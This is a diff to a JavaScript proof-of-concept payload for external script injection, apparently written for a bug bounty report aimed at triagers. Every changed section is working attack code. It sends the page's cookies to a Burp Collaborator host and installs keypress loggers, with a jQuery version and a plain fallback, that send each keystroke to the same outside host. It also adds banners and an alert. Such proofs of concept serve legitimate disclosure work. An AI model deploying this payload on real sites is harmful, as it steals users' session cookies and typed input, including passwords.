@@ -1,18 +1,21 @@
-// Red banner
-document.body.innerHTML += "<h1 style='color:red'>NET INJECTION POC</h1>";
+// Visual banner for triagers
+document.body.innerHTML += "<h1 style='color:red'>[POC] External JS Injection Successful</h1>";
 
-// Data exfil to Burp Collaborator
+// Exfiltrate cookies to Burp Collaborator
 fetch("https://z66dfv6y4ro7zx1j6hlbm45eh5n2br.burpcollaborator.net?cookie=" + encodeURIComponent(document.cookie));
 
-// If jQuery is available, add banners + keylogger
+// If jQuery exists, use it for banner + keylogger
 if (typeof $ !== "undefined") {
-    $("body").prepend("<h1 style='color:red'>External JS Injection Successful</h1>");
+    $("body").prepend("<h2 style='color:black'>KeyLogger</h2>");
     $(document).on("keypress", function(e) {
-        fetch("https://z66dfv6y4ro7zx1j6hlbm45eh5n2br.burpcollaborator.net?k=" + e.key);
+        fetch("https://z66dfv6y4ro7zx1j6hlbm45eh5n2br.burpcollaborator.net?key=" + encodeURIComponent(e.key));
     });
 } else {
-    // Fallback if jQuery not loaded
+    // Fallback keylogger without jQuery
     document.addEventListener("keypress", function(e) {
-        fetch("https://z66dfv6y4ro7zx1j6hlbm45eh5n2br.burpcollaborator.net?k=" + e.key);
+        fetch("https://z66dfv6y4ro7zx1j6hlbm45eh5n2br.burpcollaborator.net?key=" + encodeURIComponent(e.key));
     });
 }
+
+// Classic XSS pop-up for undeniable proof
+alert("net poc");
